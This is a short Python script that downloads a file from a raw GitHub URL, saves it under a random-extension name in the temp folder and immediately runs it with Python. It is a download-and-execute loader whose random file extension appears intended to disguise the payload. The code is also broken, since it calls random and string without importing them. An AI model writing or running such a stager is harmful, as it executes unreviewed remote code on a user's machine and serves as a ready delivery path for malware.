import subprocess
import tempfile
import pathlib
import requests


def random_ext(n=3):
    return "." + "".join(random.choices(string.ascii_lowercase, k=n))

URL = "https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/user_script.py"  # remote file URL

# Download remote content
content = requests.get(URL, timeout=10).text

# Create random file in %TEMP% with random name + extension
with tempfile.NamedTemporaryFile(
    mode="w",
    delete=False,
    suffix=random_ext(),
    encoding="utf-8"
) as f:
    f.write(content)
    temp_path = pathlib.Path(f.name)

print(f"Saved to: {temp_path}")

subprocess.run(["python", temp_path], check=True)




